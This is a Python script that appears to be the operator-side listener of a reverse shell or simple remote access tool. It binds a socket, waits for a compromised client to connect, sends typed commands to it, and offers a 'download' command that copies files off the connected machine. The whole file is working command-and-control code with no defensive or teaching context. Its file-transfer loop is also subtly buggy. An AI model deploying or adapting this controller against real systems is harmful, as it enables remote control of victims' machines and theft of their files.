import socket
import time

LHOST = '192.168.2.126'
LPORT = 1518

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening on port", LPORT)
client, addr = sock.accept()
print(f'[+] {addr} Client connected to the server')


while True:
    
    input_header = client.recv(3096)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                read_data = client.recv(1024)
                f.write(read_data)
                if read_data == b"DONE":
                    break

    if command is b"":
        print("Please enter a command")
    else:
        client.send(command)
        data = client.recv(3096).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data)
client.close()
sock.close()